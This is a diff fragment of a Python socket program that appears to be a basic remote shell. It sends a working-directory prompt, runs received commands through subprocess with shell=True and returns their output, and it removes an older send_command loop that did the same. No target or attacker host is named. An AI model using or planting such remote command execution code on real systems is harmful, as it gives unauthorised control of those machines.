@@ -41,6 +41,8 @@ def socket_accept():
     print("Connection has been established")
     print("IP: " + address[0] + "  |  Port: " + str(address[1]))
     while True:
+        currentWD = os.getcwd() + "> "
+        conn.send(str.encode(currentWD))
         client_res = conn.recv(1024)
         if client_res.decode("utf-8") == "quit":
             conn.close()
@@ -60,33 +62,9 @@ def execute_command(cmd, conn):
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
-        currentWD = os.getcwd() + "> "
-        # conn.send(str.encode(output_str + currentWD))
+        conn.send(str.encode(output_str))
 
     print(output_str)
-
-def send_command(conn):
-    while True:
-        cmd = input()
-        if cmd == "quit":
-            conn.close()
-            s.close()
-            sys.exit()
-            
-        if cmd[:2].decode("utf-8") == "cd":
-            os.chdir(cmd[3:].decode("utf-8"))
-            
-        
-            
-        if len(cmd) > 0:
-            cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, 
-                                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_byte, "utf-8")
-            currentWD = os.getcwd() + "> "
-            conn.send(str.encode(output_str + currentWD))
-
-            print(output_str)
             
 
             
